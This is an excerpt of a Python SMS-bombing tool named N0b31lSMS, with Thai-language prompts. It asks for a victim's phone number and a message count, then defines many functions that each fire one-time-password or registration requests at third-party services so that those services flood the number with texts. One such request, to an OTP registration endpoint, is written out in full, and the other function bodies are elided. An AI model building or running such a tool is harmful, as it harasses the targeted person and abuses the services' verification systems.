...
def sms_pam():
    ...
    print("")
    print("")
    phone = input(f"{Color.blue_violet}เบอร์: >>> ")
    count = int(input(f"{Color.blue_violet}จำนวน: >>> "))
    print()
    sleep(1)
    ...
    def trueh():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS ()')
        except:pass
    ...
    def newa37():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (ezregis01)')
        except:pass

    def newa38():
        try:
            requests.post("https://mapi.dung919.com/api/otp/register",json={"applicant":f"{phone}","serviceName":"dung919.com"})
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (mapi.dung919)')
        except:pass
    ...
    def newa39():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (instagram)')
        except:pass
    ...
    def newa41():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (1ufa)')
        except:pass
    ...
    def newa40():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (api.set.or.th)')
        except:pass
    ...
    def newa42():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (api.jobbkk)')
        except:pass
    ...
    def icq():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (u.icq.net)')
        except:pass
    ...
    def firster():
        try:
            ...
            print(receive_color() + f'[{now()}] ยิง SMS เสร็จโดย N0b31lSMS (graph.firster)')
        except:pass
